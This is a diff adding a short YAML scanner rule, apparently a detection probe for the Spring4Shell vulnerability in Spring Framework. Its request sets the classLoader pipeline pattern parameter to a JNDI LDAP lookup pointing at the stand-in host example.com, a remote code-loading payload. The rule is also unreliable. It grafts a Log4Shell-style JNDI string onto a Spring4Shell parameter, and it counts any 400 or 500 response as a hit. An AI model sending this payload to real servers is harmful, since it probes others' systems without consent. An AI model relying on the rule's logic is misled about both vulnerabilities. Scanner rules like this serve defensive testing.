@@ -1,0 +1,14 @@
+name: poc-spring4shell
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%%7b%%7bjndi:ldap:%%2f%%2fexample.com%%2fa%%7d%%7d"
+    expression: response.status == 400 || response.status == 500 || response.body.bcontains("spring") || response.body.bcontains("jndi")
+expression: r0()
+detail:
+  author: sxel
+  description: Spring Framework class property RCE probe (Spring4Shell CVE-2022-22965, detection-only)
+  severity: critical
+  tags: spring,java,rce
